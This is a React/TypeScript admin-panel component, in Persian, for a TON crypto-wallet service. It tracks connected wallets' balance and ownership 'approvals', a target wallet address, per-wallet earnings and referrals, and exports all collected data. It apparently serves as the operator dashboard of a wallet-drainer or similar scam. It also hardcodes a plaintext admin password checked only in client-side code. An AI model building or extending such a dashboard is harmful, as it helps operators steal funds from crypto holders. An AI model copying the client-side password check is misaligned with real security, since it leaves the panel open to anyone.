
import { useState, useEffect } from 'react';
import { tonWalletService, WalletConnection } from '../../services/tonService';
import { referralService, ReferralData } from '../../services/referralService';

const ADMIN_PASSWORD = 'Ma@09140238830';

export default function AdminPanel() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [connectedWallets, setConnectedWallets] = useState<WalletConnection[]>([]);
  const [referralData, setReferralData] = useState<ReferralData[]>([]);
  const [activeTab, setActiveTab] = useState('wallets');
  const [currentPage, setCurrentPage] = useState(1);
  const [itemsPerPage, setItemsPerPage] = useState(100);
  const [searchTerm, setSearchTerm] = useState('');
  const [sortBy, setSortBy] = useState<'address' | 'connectedAt' | 'balanceRequestCount' | 'ownershipRequestCount' | 'lastActivity'>('connectedAt');
  const [sortOrder, setSortOrder] = useState<'asc' | 'desc'>('desc');
  const [filterStatus, setFilterStatus] = useState<'all' | 'approved' | 'pending' | 'active'>('all');
  const [stats, setStats] = useState({
    totalWallets: 0,
    activeWallets: 0,
    totalMessages: 0,
    approvedBalance: 0,
    approvedOwnership: 0,
    totalReferrals: 0,
    totalEarnings: 0,
    successRate: 0,
    averageConnectionTime: 0,
  });
  const [performanceMetrics, setPerformanceMetrics] = useState({
    totalWallets: 0,
    maxCapacity: 0,
    utilizationRate: 0,
    batchSize: 0,
    processingQueueSize: 0,
    isProcessing: false,
    memoryUsage: 0,
    storageUsage: 0
  });
  const [isExporting, setIsExporting] = useState(false);
  const [lastUpdate, setLastUpdate] = useState(Date.now());

  useEffect(() => {
    if (isAuthenticated) {
      loadData();
      const interval = setInterval(() => {
        loadData();
        setLastUpdate(Date.now());
      }, 3000); // Update every 3 seconds for real-time monitoring
      return () => clearInterval(interval);
    }
  }, [isAuthenticated]);

  const loadData = () => {
    try {
      const walletStats = tonWalletService.getWalletStats();
      const wallets = tonWalletService.getConnectedWallets();
      const referrals = referralService.getAllReferralData();
      const performance = tonWalletService.getPerformanceMetrics();
      
      setConnectedWallets(wallets);
      setReferralData(referrals);
      setPerformanceMetrics(performance);
      
      const totalMessages = wallets.reduce((sum, wallet) => 
        sum + wallet.balanceRequestCount + wallet.ownershipRequestCount, 0
      );
      const totalReferrals = referrals.reduce((sum, ref) => sum + ref.totalReferrals, 0);
      
      setStats({
        totalWallets: walletStats.totalConnected,
        activeWallets: walletStats.activeWallets,
        totalMessages: totalMessages,
        approvedBalance: walletStats.balanceApproved,
        approvedOwnership: walletStats.ownershipApproved,
        totalReferrals: totalReferrals,
        totalEarnings: walletStats.totalEarnings,
        successRate: walletStats.successRate,
        averageConnectionTime: walletStats.averageConnectionTime,
      });
    } catch (error) {
      console.error('Error loading data:', error);
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === ADMIN_PASSWORD) {
      setIsAuthenticated(true);
      setPassword('');
    } else {
      alert('Invalid password!');
    }
  };

  const formatAddress = (address: string) => {
    return `${address.slice(0, 8)}...${address.slice(-8)}`;
  };

  const formatDate = (timestamp: number) => {
    return new Date(timestamp).toLocaleString('fa-IR');
  };

  const formatDuration = (milliseconds: number) => {
    const hours = Math.floor(milliseconds / (1000 * 60 * 60));
    const minutes = Math.floor((milliseconds % (1000 * 60 * 60)) / (1000 * 60));
    return `${hours}h ${minutes}m`;
  };

  const formatBytes = (bytes: number) => {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
  };

  // Enhanced filtering and sorting with unlimited support
  const getFilteredAndSortedWallets = () => {
    let filtered = connectedWallets.filter(wallet => {
      const matchesSearch = wallet.address.toLowerCase().includes(searchTerm.toLowerCase()) ||
        wallet.referralCode?.toLowerCase().includes(searchTerm.toLowerCase());
      
      let matchesFilter = true;
      switch (filterStatus) {
        case 'approved':
          matchesFilter = wallet.balanceApproved && wallet.ownershipApproved;
          break;
        case 'pending':
          matchesFilter = !wallet.balanceApproved || !wallet.ownershipApproved;
          break;
        case 'active':
          matchesFilter = wallet.isActive;
          break;
        default:
          matchesFilter = true;
      }
      
      return matchesSearch && matchesFilter;
    });

    filtered.sort((a, b) => {
      let aValue: any, bValue: any;
      
      switch (sortBy) {
        case 'address':
          aValue = a.address;
          bValue = b.address;
          break;
        case 'connectedAt':
          aValue = a.connectedAt;
          bValue = b.connectedAt;
          break;
        case 'balanceRequestCount':
          aValue = a.balanceRequestCount;
          bValue = b.balanceRequestCount;
          break;
        case 'ownershipRequestCount':
          aValue = a.ownershipRequestCount;
          bValue = b.ownershipRequestCount;
          break;
        case 'lastActivity':
          aValue = a.lastActivity;
          bValue = b.lastActivity;
          break;
        default:
          aValue = a.connectedAt;
          bValue = b.connectedAt;
      }

      if (sortOrder === 'asc') {
        return aValue > bValue ? 1 : -1;
      } else {
        return aValue < bValue ? 1 : -1;
      }
    });

    return filtered;
  };

  // Enhanced pagination with unlimited support
  const getPaginatedWallets = () => {
    const filtered = getFilteredAndSortedWallets();
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    return {
      wallets: filtered.slice(startIndex, endIndex),
      totalCount: filtered.length,
      totalPages: Math.ceil(filtered.length / itemsPerPage)
    };
  };

  // Enhanced pagination for referrals
  const getPaginatedReferrals = () => {
    const filtered = referralData.filter(ref => 
      ref.userId.toLowerCase().includes(searchTerm.toLowerCase()) ||
      ref.referralCode.toLowerCase().includes(searchTerm.toLowerCase())
    );
    
    const startIndex = (currentPage - 1) * itemsPerPage;
    const endIndex = startIndex + itemsPerPage;
    return {
      referrals: filtered.slice(startIndex, endIndex),
      totalCount: filtered.length,
      totalPages: Math.ceil(filtered.length / itemsPerPage)
    };
  };

  // Enhanced CSV export with all data
  const exportToCSV = async () => {
    setIsExporting(true);
    try {
      const wallets = getFilteredAndSortedWallets();
      const csvContent = [
        ['آدرس کیف پول', 'زمان اتصال', 'آخرین فعالیت', 'درخواست موجودی', 'درخواست مالکیت', 'تایید موجودی', 'تایید مالکیت', 'تعداد تراکنش', 'وضعیت', 'کد دعوت', 'کل درآمد'],
        ...wallets.map(wallet => [
          wallet.address,
          formatDate(wallet.connectedAt),
          formatDate(wallet.lastActivity),
          wallet.balanceRequestCount,
          wallet.ownershipRequestCount,
          wallet.balanceApproved ? 'تایید شده' : 'در انتظار',
          wallet.ownershipApproved ? 'تایید شده' : 'در انتظار',
          wallet.transactionHistory.length,
          wallet.isActive ? 'فعال' : 'غیرفعال',
          wallet.referralCode || 'ندارد',
          wallet.totalEarnings.toFixed(2)
        ])
      ].map(row => row.join(',')).join('\n');

      const blob = new Blob(['\uFEFF' + csvContent], { type: 'text/csv;charset=utf-8;' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = `wallets_${new Date().toISOString().split('T')[0]}_${wallets.length}_records.csv`;
      link.click();
    } catch (error) {
      console.error('Export failed:', error);
      alert('خطا در دانلود فایل!');
    } finally {
      setIsExporting(false);
    }
  };

  // Export system backup
  const exportSystemBackup = async () => {
    setIsExporting(true);
    try {
      const backupData = tonWalletService.exportWalletData();
      const blob = new Blob([JSON.stringify(backupData, null, 2)], { type: 'application/json' });
      const link = document.createElement('a');
      link.href = URL.createObjectURL(blob);
      link.download = `system_backup_${new Date().toISOString().split('T')[0]}.json`;
      link.click();
    } catch (error) {
      console.error('Backup export failed:', error);
      alert('خطا در تهیه پشتیبان!');
    } finally {
      setIsExporting(false);
    }
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-900 to-black flex items-center justify-center p-4">
        <div className="bg-gray-800 border border-gray-700 rounded-2xl p-8 max-w-md w-full">
          <div className="text-center mb-8">
            <i className="ri-shield-keyhole-line text-6xl text-yellow-400 mb-4"></i>
            <h1 className="text-3xl font-bold text-white mb-2">پنل مدیریت پیشرفته</h1>
            <p className="text-gray-400">سیستم پشتیبانی نامحدود کیف پول</p>
          </div>
          
          <form onSubmit={handleLogin}>
            <div className="mb-6">
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="رمز عبور مدیر را وارد کنید"
                className="w-full bg-gray-900 border border-gray-600 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500"
                required
              />
            </div>
            
            <button
              type="submit"
              className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-bold py-3 px-6 rounded-lg transition-all duration-300 whitespace-nowrap cursor-pointer"
            >
              <i className="ri-login-box-line mr-2"></i>
              ورود به سیستم
            </button>
          </form>
        </div>
      </div>
    );
  }

  const paginatedData = activeTab === 'wallets' ? getPaginatedWallets() : getPaginatedReferrals();

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-900 to-black p-4">
      <div className="max-w-7xl mx-auto">
        {/* Enhanced Header */}
        <div className="bg-gray-800 border border-gray-700 rounded-2xl p-6 mb-8">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-3xl font-bold text-white mb-2">
                <i className="ri-dashboard-line mr-3 text-yellow-400"></i>
                پنل مدیریت نامحدود
              </h1>
              <p className="text-gray-400">سیستم پشتیبانی بی‌نهایت کیف پول TON</p>
              <div className="flex items-center mt-2 text-sm text-gray-500">
                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse mr-2"></div>
                آخرین به‌روزرسانی: {formatDate(lastUpdate)}
              </div>
            </div>
            <div className="flex items-center space-x-4">
              <button
                onClick={exportSystemBackup}
                disabled={isExporting}
                className="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg font-bold transition-colors whitespace-nowrap cursor-pointer disabled:opacity-50"
              >
                <i className="ri-database-2-line mr-2"></i>
                {isExporting ? 'در حال تهیه...' : 'پشتیبان سیستم'}
              </button>
              <button
                onClick={exportToCSV}
                disabled={isExporting}
                className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg font-bold transition-colors whitespace-nowrap cursor-pointer disabled:opacity-50"
              >
                <i className="ri-download-line mr-2"></i>
                {isExporting ? 'در حال دانلود...' : 'دانلود CSV'}
              </button>
              <button
                onClick={() => setIsAuthenticated(false)}
                className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg font-bold transition-colors whitespace-nowrap cursor-pointer"
              >
                <i className="ri-logout-box-line mr-2"></i>
                خروج
              </button>
            </div>
          </div>
        </div>

        {/* Enhanced Performance Metrics */}
        <div className="bg-gray-800 border border-gray-700 rounded-2xl p-6 mb-8">
          <h3 className="text-xl font-bold text-white mb-4">
            <i className="ri-speed-line mr-2 text-green-400"></i>
            متریک‌های عملکرد سیستم
          </h3>
          <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-8 gap-4">
            <div className="bg-gray-900 rounded-lg p-4 text-center">
              <div className="text-2xl font-bold text-blue-400">{performanceMetrics.totalWallets.toLocaleString('fa-IR')}</div>
              <div className="text-xs text-gray-400">کل کیف پول‌ها</div>
            </div>
            <div className="bg-gray-900 rounded-lg p-4 text-center">
              <div className="text-2xl font-bold text-green-400">∞</div>
              <div className="text-xs text-gray-400">ظرفیت سیستم</div>
            </div>
            <div className="bg-gray-900 rounded-lg p-4 text-center">
              <div className="text-2xl font-bold text-yellow-400">{performanceMetrics.batchSize}</div>
              <div className="text-xs text-gray-400">اندازه دسته</div>
            </div>
            <div className="bg-gray-900 rounded-lg p-4 text-center">
              <div className="text-2xl font-bold text-purple-400">{performanceMetrics.processingQueueSize}</div>
              <div className="text-xs text-gray-400">صف پردازش</div>
            </div>
            <div className="bg-gray-900 rounded-lg p-4 text-center">
              <div className={`text-2xl font-bold ${performanceMetrics.isProcessing ? 'text-orange-400' : 'text-gray-400'}`}>
                {performanceMetrics.isProcessing ? '🔄' : '⏸️'}
              </div>
              <div className="text-xs text-gray-400">وضعیت پردازش</div>
            </div>
            <div className="bg-gray-900 rounded-lg p-4 text-center">
              <div className="text-2xl font-bold text-cyan-400">{performanceMetrics.memoryUsage.toFixed(1)}</div>
              <div className="text-xs text-gray-400">حافظه (MB)</div>
            </div>
            <div className="bg-gray-900 rounded-lg p-4 text-center">
              <div className="text-2xl font-bold text-pink-400">{performanceMetrics.storageUsage.toFixed(1)}</div>
              <div className="text-xs text-gray-400">ذخیره (MB)</div>
            </div>
            <div className="bg-gray-900 rounded-lg p-4 text-center">
              <div className="text-2xl font-bold text-indigo-400">{stats.successRate.toFixed(1)}%</div>
              <div className="text-xs text-gray-400">نرخ موفقیت</div>
            </div>
          </div>
        </div>

        {/* Enhanced Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-6 gap-6 mb-8">
          <div className="bg-gradient-to-r from-blue-500/20 to-blue-600/20 border border-blue-500/30 rounded-xl p-6">
            <div className="text-center">
              <i className="ri-wallet-line text-3xl text-blue-400 mb-2"></i>
              <div className="text-2xl font-bold text-white">{stats.totalWallets.toLocaleString('fa-IR')}</div>
              <div className="text-blue-300 text-sm">کل کیف پول‌ها</div>
              <div className="text-xs text-blue-200 mt-1">فعال: {stats.activeWallets.toLocaleString('fa-IR')}</div>
            </div>
          </div>
          
          <div className="bg-gradient-to-r from-green-500/20 to-green-600/20 border border-green-500/30 rounded-xl p-6">
            <div className="text-center">
              <i className="ri-message-line text-3xl text-green-400 mb-2"></i>
              <div className="text-2xl font-bold text-white">{stats.totalMessages.toLocaleString('fa-IR')}</div>
              <div className="text-green-300 text-sm">کل پیام‌ها</div>
              <div className="text-xs text-green-200 mt-1">میانگین: {stats.totalWallets > 0 ? (stats.totalMessages / stats.totalWallets).toFixed(1) : '0'}</div>
            </div>
          </div>
          
          <div className="bg-gradient-to-r from-yellow-500/20 to-yellow-600/20 border border-yellow-500/30 rounded-xl p-6">
            <div className="text-center">
              <i className="ri-money-dollar-circle-line text-3xl text-yellow-400 mb-2"></i>
              <div className="text-2xl font-bold text-white">{stats.approvedBalance.toLocaleString('fa-IR')}</div>
              <div className="text-yellow-300 text-sm">موجودی تایید</div>
              <div className="text-xs text-yellow-200 mt-1">{stats.totalWallets > 0 ? ((stats.approvedBalance / stats.totalWallets) * 100).toFixed(1) : '0'}%</div>
            </div>
          </div>
          
          <div className="bg-gradient-to-r from-purple-500/20 to-purple-600/20 border border-purple-500/30 rounded-xl p-6">
            <div className="text-center">
              <i className="ri-key-line text-3xl text-purple-400 mb-2"></i>
              <div className="text-2xl font-bold text-white">{stats.approvedOwnership.toLocaleString('fa-IR')}</div>
              <div className="text-purple-300 text-sm">مالکیت تایید</div>
              <div className="text-xs text-purple-200 mt-1">{stats.totalWallets > 0 ? ((stats.approvedOwnership / stats.totalWallets) * 100).toFixed(1) : '0'}%</div>
            </div>
          </div>
          
          <div className="bg-gradient-to-r from-pink-500/20 to-pink-600/20 border border-pink-500/30 rounded-xl p-6">
            <div className="text-center">
              <i className="ri-user-add-line text-3xl text-pink-400 mb-2"></i>
              <div className="text-2xl font-bold text-white">{stats.totalReferrals.toLocaleString('fa-IR')}</div>
              <div className="text-pink-300 text-sm">کل دعوت‌ها</div>
              <div className="text-xs text-pink-200 mt-1">کاربران: {referralData.length.toLocaleString('fa-IR')}</div>
            </div>
          </div>

          <div className="bg-gradient-to-r from-indigo-500/20 to-indigo-600/20 border border-indigo-500/30 rounded-xl p-6">
            <div className="text-center">
              <i className="ri-coins-line text-3xl text-indigo-400 mb-2"></i>
              <div className="text-2xl font-bold text-white">{stats.totalEarnings.toFixed(0).toLocaleString('fa-IR')}</div>
              <div className="text-indigo-300 text-sm">کل درآمد</div>
              <div className="text-xs text-indigo-200 mt-1">TON</div>
            </div>
          </div>
        </div>

        {/* System Info Panel */}
        <div className="bg-gray-800 border border-gray-700 rounded-2xl p-6 mb-8">
          <h3 className="text-xl font-bold text-white mb-4">
            <i className="ri-information-line mr-2 text-blue-400"></i>
            اطلاعات سیستم نامحدود
          </h3>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div>
              <div className="text-sm text-gray-400 mb-1">آدرس کیف پول هدف:</div>
              <div className="font-mono text-green-400 bg-gray-900 p-2 rounded text-sm break-all">
                {tonWalletService.getTargetAddress()}
              </div>
            </div>
            <div>
              <div className="text-sm text-gray-400 mb-1">وضعیت سرویس:</div>
              <div className={`font-bold p-2 rounded ${
                tonWalletService.isConfigured() 
                  ? 'text-green-400 bg-green-900/20' 
                  : 'text-red-400 bg-red-900/20'
              }`}>
                {tonWalletService.isConfigured() ? '🟢 آماده پشتیبانی نامحدود' : '🔴 مشکل در پیکربندی'}
              </div>
            </div>
            <div>
              <div className="text-sm text-gray-400 mb-1">میانگین زمان اتصال:</div>
              <div className="font-bold text-cyan-400 bg-gray-900 p-2 rounded">
                {formatDuration(stats.averageConnectionTime)}
              </div>
            </div>
          </div>
        </div>

        {/* Enhanced Controls */}
        <div className="bg-gray-800 border border-gray-700 rounded-2xl p-6 mb-8">
          <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
            {/* Search */}
            <div className="flex-1 max-w-md">
              <div className="relative">
                <i className="ri-search-line absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400"></i>
                <input
                  type="text"
                  placeholder="جستجو بر اساس آدرس یا کد دعوت..."
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="w-full bg-gray-900 border border-gray-600 rounded-lg pl-10 pr-4 py-2 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500"
                />
              </div>
            </div>

            {/* Enhanced Filters */}
            <div className="flex flex-wrap items-center gap-4">
              {activeTab === 'wallets' && (
                <>
                  <select
                    value={filterStatus}
                    onChange={(e) => setFilterStatus(e.target.value as any)}
                    className="bg-gray-900 border border-gray-600 rounded-lg px-3 py-2 text-white focus:outline-none focus:border-blue-500"
                  >
                    <option value="all">همه وضعیت‌ها</option>
                    <option value="approved">تایید شده</option>
                    <option value="pending">در انتظار</option>
                    <option value="active">فعال</option>
                  </select>

                  <select
                    value={sortBy}
                    onChange={(e) => setSortBy(e.target.value as any)}
                    className="bg-gray-900 border border-gray-600 rounded-lg px-3 py-2 text-white focus:outline-none focus:border-blue-500"
                  >
                    <option value="connectedAt">زمان اتصال</option>
                    <option value="lastActivity">آخرین فعالیت</option>
                    <option value="address">آدرس</option>
                    <option value="balanceRequestCount">درخواست موجودی</option>
                    <option value="ownershipRequestCount">درخواست مالکیت</option>
                  </select>

                  <button
                    onClick={() => setSortOrder(sortOrder === 'asc' ? 'desc' : 'asc')}
                    className="bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg transition-colors cursor-pointer"
                  >
                    <i className={`ri-sort-${sortOrder === 'asc' ? 'asc' : 'desc'}-line`}></i>
                  </button>
                </>
              )}

              <select
                value={itemsPerPage}
                onChange={(e) => {
                  setItemsPerPage(Number(e.target.value));
                  setCurrentPage(1);
                }}
                className="bg-gray-900 border border-gray-600 rounded-lg px-3 py-2 text-white focus:outline-none focus:border-blue-500"
              >
                <option value={50}>50 آیتم</option>
                <option value={100}>100 آیتم</option>
                <option value={250}>250 آیتم</option>
                <option value={500}>500 آیتم</option>
                <option value={1000}>1000 آیتم</option>
                <option value={2500}>2500 آیتم</option>
                <option value={5000}>5000 آیتم</option>
              </select>
            </div>
          </div>
        </div>

        {/* Enhanced Tabs */}
        <div className="bg-gray-800 border border-gray-700 rounded-2xl overflow-hidden">
          <div className="flex border-b border-gray-700">
            <button
              onClick={() => {
                setActiveTab('wallets');
                setCurrentPage(1);
                setSearchTerm('');
              }}
              className={`flex-1 px-6 py-4 font-bold transition-colors whitespace-nowrap cursor-pointer ${
                activeTab === 'wallets'
                  ? 'bg-blue-600 text-white'
                  : 'text-gray-400 hover:text-white hover:bg-gray-700'
              }`}
            >
              <i className="ri-wallet-line mr-2"></i>
              کیف پول‌های متصل ({stats.totalWallets.toLocaleString('fa-IR')})
              <span className="ml-2 text-xs bg-green-500 text-white px-2 py-1 rounded-full">نامحدود</span>
            </button>
            <button
              onClick={() => {
                setActiveTab('referrals');
                setCurrentPage(1);
                setSearchTerm('');
              }}
              className={`flex-1 px-6 py-4 font-bold transition-colors whitespace-nowrap cursor-pointer ${
                activeTab === 'referrals'
                  ? 'bg-blue-600 text-white'
                  : 'text-gray-400 hover:text-white hover:bg-gray-700'
              }`}
            >
              <i className="ri-user-add-line mr-2"></i>
              سیستم دعوت ({referralData.length.toLocaleString('fa-IR')})
            </button>
          </div>

          <div className="p-6">
            {/* Enhanced Pagination Info */}
            <div className="flex items-center justify-between mb-6">
              <div className="text-gray-400 text-sm">
                نمایش {((currentPage - 1) * itemsPerPage) + 1} تا {Math.min(currentPage * itemsPerPage, paginatedData.totalCount)} از {paginatedData.totalCount.toLocaleString('fa-IR')} آیتم
                {paginatedData.totalCount > 10000 && (
                  <span className="ml-2 text-green-400 font-bold">• سیستم نامحدود فعال</span>
                )}
              </div>
              <div className="text-gray-400 text-sm">
                صفحه {currentPage.toLocaleString('fa-IR')} از {paginatedData.totalPages.toLocaleString('fa-IR')}
              </div>
            </div>

            {activeTab === 'wallets' && (
              <div>
                {paginatedData.wallets.length === 0 ? (
                  <div className="text-center py-12">
                    <i className="ri-wallet-line text-6xl text-gray-600 mb-4"></i>
                    <p className="text-gray-400">
                      {searchTerm || filterStatus !== 'all' ? 'هیچ کیف پولی با این فیلتر یافت نشد' : 'هنوز کیف پولی متصل نشده'}
                    </p>
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b border-gray-700">
                          <th className="text-right py-3 px-4 text-gray-300">ردیف</th>
                          <th className="text-right py-3 px-4 text-gray-300">آدرس کیف پول</th>
                          <th className="text-right py-3 px-4 text-gray-300">زمان اتصال</th>
                          <th className="text-right py-3 px-4 text-gray-300">آخرین فعالیت</th>
                          <th className="text-center py-3 px-4 text-gray-300">درخواست‌ها</th>
                          <th className="text-center py-3 px-4 text-gray-300">وضعیت</th>
                          <th className="text-center py-3 px-4 text-gray-300">تراکنش‌ها</th>
                          <th className="text-center py-3 px-4 text-gray-300">درآمد</th>
                          <th className="text-center py-3 px-4 text-gray-300">کد دعوت</th>
                        </tr>
                      </thead>
                      <tbody>
                        {paginatedData.wallets.map((wallet, index) => (
                          <tr key={wallet.address} className="border-b border-gray-800 hover:bg-gray-700/30">
                            <td className="py-3 px-4 text-gray-300">
                              {((currentPage - 1) * itemsPerPage) + index + 1}
                            </td>
                            <td className="py-3 px-4">
                              <div className="font-mono text-blue-400 text-xs">
                                {formatAddress(wallet.address)}
                              </div>
                              <div className="flex items-center mt-1">
                                <div className={`w-2 h-2 rounded-full mr-2 ${wallet.isActive ? 'bg-green-400' : 'bg-red-400'}`}></div>
                                <span className="text-xs text-gray-500">
                                  {wallet.isActive ? 'فعال' : 'غیرفعال'}
                                </span>
                              </div>
                            </td>
                            <td className="py-3 px-4 text-gray-300 text-xs">
                              {formatDate(wallet.connectedAt)}
                            </td>
                            <td className="py-3 px-4 text-gray-300 text-xs">
                              {formatDate(wallet.lastActivity)}
                              <div className="text-xs text-gray-500 mt-1">
                                {formatDuration(Date.now() - wallet.lastActivity)} پیش
                              </div>
                            </td>
                            <td className="py-3 px-4">
                              <div className="flex flex-col space-y-1">
                                <span className="bg-blue-600 text-white px-2 py-1 rounded text-xs text-center">
                                  موجودی: {wallet.balanceRequestCount.toLocaleString('fa-IR')}
                                </span>
                                <span className="bg-purple-600 text-white px-2 py-1 rounded text-xs text-center">
                                  مالکیت: {wallet.ownershipRequestCount.toLocaleString('fa-IR')}
                                </span>
                              </div>
                            </td>
                            <td className="py-3 px-4">
                              <div className="flex flex-col space-y-1">
                                <span className={`px-2 py-1 rounded text-xs text-center ${
                                  wallet.balanceApproved 
                                    ? 'bg-green-600 text-white' 
                                    : 'bg-red-600 text-white'
                                }`}>
                                  موجودی: {wallet.balanceApproved ? '✅' : '⏳'}
                                </span>
                                <span className={`px-2 py-1 rounded text-xs text-center ${
                                  wallet.ownershipApproved 
                                    ? 'bg-green-600 text-white' 
                                    : 'bg-red-600 text-white'
                                }`}>
                                  مالکیت: {wallet.ownershipApproved ? '✅' : '⏳'}
                                </span>
                              </div>
                            </td>
                            <td className="py-3 px-4 text-center">
                              <span className="bg-gray-600 text-white px-2 py-1 rounded text-xs">
                                {wallet.transactionHistory.length.toLocaleString('fa-IR')}
                              </span>
                              <div className="text-xs text-gray-500 mt-1">
                                تایید: {wallet.transactionHistory.filter(tx => tx.blockchainConfirmed).length.toLocaleString('fa-IR')}
                              </div>
                            </td>
                            <td className="py-3 px-4 text-center">
                              <span className="bg-yellow-600 text-white px-2 py-1 rounded text-xs">
                                {wallet.totalEarnings.toFixed(2)} TON
                              </span>
                            </td>
                            <td className="py-3 px-4 text-center">
                              <span className="bg-indigo-600 text-white px-2 py-1 rounded text-xs font-mono">
                                {wallet.referralCode || 'ندارد'}
                              </span>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>
            )}

            {activeTab === 'referrals' && (
              <div>
                {paginatedData.referrals.length === 0 ? (
                  <div className="text-center py-12">
                    <i className="ri-user-add-line text-6xl text-gray-600 mb-4"></i>
                    <p className="text-gray-400">
                      {searchTerm ? 'هیچ دعوتی با این جستجو یافت نشد' : 'هنوز داده دعوتی وجود ندارد'}
                    </p>
                  </div>
                ) : (
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b border-gray-700">
                          <th className="text-right py-3 px-4 text-gray-300">ردیف</th>
                          <th className="text-right py-3 px-4 text-gray-300">آدرس کاربر</th>
                          <th className="text-center py-3 px-4 text-gray-300">کد دعوت</th>
                          <th className="text-center py-3 px-4 text-gray-300">کل دعوت‌ها</th>
                          <th className="text-center py-3 px-4 text-gray-300">چرخش جایزه</th>
                          <th className="text-right py-3 px-4 text-gray-300">تاریخ ایجاد</th>
                        </tr>
                      </thead>
                      <tbody>
                        {paginatedData.referrals.map((ref, index) => (
                          <tr key={ref.userId} className="border-b border-gray-800 hover:bg-gray-700/30">
                            <td className="py-3 px-4 text-gray-300">
                              {((currentPage - 1) * itemsPerPage) + index + 1}
                            </td>
                            <td className="py-3 px-4">
                              <div className="font-mono text-blue-400 text-xs">
                                {formatAddress(ref.userId)}
                              </div>
                            </td>
                            <td className="py-3 px-4 text-center">
                              <span className="bg-purple-600 text-white px-2 py-1 rounded font-mono text-xs">
                                {ref.referralCode}
                              </span>
                            </td>
                            <td className="py-3 px-4 text-center">
                              <span className="bg-green-600 text-white px-2 py-1 rounded text-xs">
                                {ref.totalReferrals.toLocaleString('fa-IR')}
                              </span>
                            </td>
                            <td className="py-3 px-4 text-center">
                              <span className="bg-yellow-600 text-white px-2 py-1 rounded text-xs">
                                {ref.bonusSpins.toLocaleString('fa-IR')}
                              </span>
                            </td>
                            <td className="py-3 px-4 text-gray-300 text-xs">
                              {formatDate(ref.createdAt)}
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                )}
              </div>
            )}

            {/* Enhanced Pagination Controls */}
            {paginatedData.totalPages > 1 && (
              <div className="flex items-center justify-between mt-8">
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() => setCurrentPage(1)}
                    disabled={currentPage === 1}
                    className="px-3 py-2 bg-gray-700 text-white rounded-lg disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors cursor-pointer"
                  >
                    <i className="ri-skip-back-line"></i>
                  </button>
                  <button
                    onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
                    disabled={currentPage === 1}
                    className="px-3 py-2 bg-gray-700 text-white rounded-lg disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors cursor-pointer"
                  >
                    <i className="ri-arrow-right-line"></i>
                  </button>
                </div>

                <div className="flex items-center space-x-1">
                  {Array.from({ length: Math.min(7, paginatedData.totalPages) }, (_, i) => {
                    let pageNum;
                    if (paginatedData.totalPages <= 7) {
                      pageNum = i + 1;
                    } else if (currentPage <= 4) {
                      pageNum = i + 1;
                    } else if (currentPage >= paginatedData.totalPages - 3) {
                      pageNum = paginatedData.totalPages - 6 + i;
                    } else {
                      pageNum = currentPage - 3 + i;
                    }

                    return (
                      <button
                        key={pageNum}
                        onClick={() => setCurrentPage(pageNum)}
                        className={`px-3 py-2 rounded-lg transition-colors cursor-pointer ${
                          currentPage === pageNum
                            ? 'bg-blue-600 text-white'
                            : 'bg-gray-700 text-gray-300 hover:bg-gray-600'
                        }`}
                      >
                        {pageNum.toLocaleString('fa-IR')}
                      </button>
                    );
                  })}
                </div>

                <div className="flex items-center space-x-2">
                  <button
                    onClick={() => setCurrentPage(Math.min(paginatedData.totalPages, currentPage + 1))}
                    disabled={currentPage === paginatedData.totalPages}
                    className="px-3 py-2 bg-gray-700 text-white rounded-lg disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors cursor-pointer"
                  >
                    <i className="ri-arrow-left-line"></i>
                  </button>
                  <button
                    onClick={() => setCurrentPage(paginatedData.totalPages)}
                    disabled={currentPage === paginatedData.totalPages}
                    className="px-3 py-2 bg-gray-700 text-white rounded-lg disabled:opacity-50 disabled:cursor-not-allowed hover:bg-gray-600 transition-colors cursor-pointer"
                  >
                    <i className="ri-skip-forward-line"></i>
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
